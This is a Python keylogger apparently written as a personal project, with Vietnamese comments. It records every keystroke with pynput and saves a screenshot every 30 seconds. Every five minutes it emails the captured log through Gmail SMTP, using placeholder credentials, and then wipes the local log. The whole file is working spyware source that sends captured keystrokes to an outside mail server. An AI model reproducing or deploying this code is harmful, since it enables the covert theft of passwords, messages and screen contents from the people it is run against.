import os
import time
import smtplib
import shutil
import sqlite3
import subprocess
from email.mime.text import MIMEText
from pynput import keyboard
from PIL import ImageGrab
import threading
#tiendat
# Thiết lập file lưu log
log_file = os.path.expanduser("E:\\dự án\\keylogger\\keylog.txt")
screenshot_folder = os.path.expanduser("E:\\dự án\\keylogger\\screen")
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Hàm ghi lại các phím bấm
def on_press(key):
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f" [{key}] ")
    print(f"Đã ghi phím: {key}")  # Hiển thị trong terminal

# Hàm chụp ảnh màn hình định kỳ
def take_screenshot():
    while True:
        screenshot_files = os.listdir(screenshot_folder)

        # Kiểm tra nếu số lượng ảnh lớn hơn 10, xóa các ảnh cũ
        if len(screenshot_files) >= 10:
            screenshot_files.sort(key=lambda x: os.path.getctime(os.path.join(screenshot_folder, x)))  # Sắp xếp theo thời gian tạo
            oldest_file = screenshot_files[0]  # Lấy file cũ nhất
            os.remove(os.path.join(screenshot_folder, oldest_file))  # Xóa file cũ nhất
            print(f"Đã xóa ảnh cũ: {oldest_file}")

        # Chụp ảnh màn hình và lưu
        img = ImageGrab.grab()
        img.save(os.path.join(screenshot_folder, f"screenshot_{int(time.time())}.png"))
        print("Đã chụp ảnh màn hình và lưu.")
        time.sleep(30)  # Chụp ảnh mỗi phút

# Hàm gửi email log
def send_email():
    while True:
        time.sleep(300)  # Gửi email mỗi 5 phút
        try:
            with open(log_file, "r") as f:
                log_data = f.read()

            msg = MIMEText(log_data)
            msg["Subject"] = "Keylog Data"
            msg["From"] = "yourmail@gmail.com"
            msg["To"] = "youmail@gmail.com"

            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login("yourmail@gmail.com", "yourpass")
                server.sendmail("yourmail@gmail.com", "yourmail@gmail.com", msg.as_string())

            with open(log_file, "w") as f:
                f.write("")  # Xóa log sau khi gửi
            print("Đã gửi email log.")
        except Exception as e:
            print(f"Lỗi gửi email: {e}")

# Hàm bắt đầu listener cho bàn phím
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Giữ chương trình chạy đến khi nhấn Ctrl + C

# Chạy chương trình
if __name__ == "__main__":
    print("Keylogger đang chạy... Nhấn Ctrl + C để dừng.")

    # Chạy các luồng song song
    threading.Thread(target=take_screenshot, daemon=True).start()
    threading.Thread(target=send_email, daemon=True).start()

    # Bắt đầu keylogger (giữ chương trình chạy)
    start_keylogger()
